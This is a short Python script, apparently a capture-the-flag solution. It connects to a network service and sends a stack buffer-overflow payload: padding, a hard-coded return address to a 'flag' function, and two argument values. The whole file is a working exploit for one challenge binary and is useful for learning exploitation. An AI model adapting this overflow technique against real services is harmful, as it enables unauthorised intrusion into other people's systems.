#!/bin/python3
# You can run it: `python3 yesIknow.py <IP> <PORT>`
import socket
import sys
import struct


flag_addr = struct.pack('I', 0x080491e2)
param1_addr = struct.pack('I', 0xdeadbeef)
param2_addr = struct.pack('I', 0xc0ded00d)


def recv_handler(s):
    response = b''
    while True:
        d = s.recv(1024)
        response += d
        if b'\n' in d or d == b'':
            break

    return response

if __name__ == '__main__':
    try:
        if len(sys.argv) != 3:
            print('[-] Require two parameters')
            print(f'[-] Run: {sys.argv[0]} <IP> <PORT>')
            sys.exit(1)
    
        ip = sys.argv[1]
        port = int(sys.argv[2])
        payload = b'A' * 188 + flag_addr + b'DUMY' + param1_addr + param2_addr + b'\n'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print('[+] Socket connected')
        
        d = s.recv(1024)
        print(d)
        
        s.send(payload)
        print('[+] Payload sent')

        d = recv_handler(s)
        print(d)
        
        s.close()
        print('[+] Socket closed')
    except ConnectionRefusedError:
        print('[-] Connection refused')
    except KeyboardInterrupt:
        print('[+] Detected Ctrl+C, quitting..')
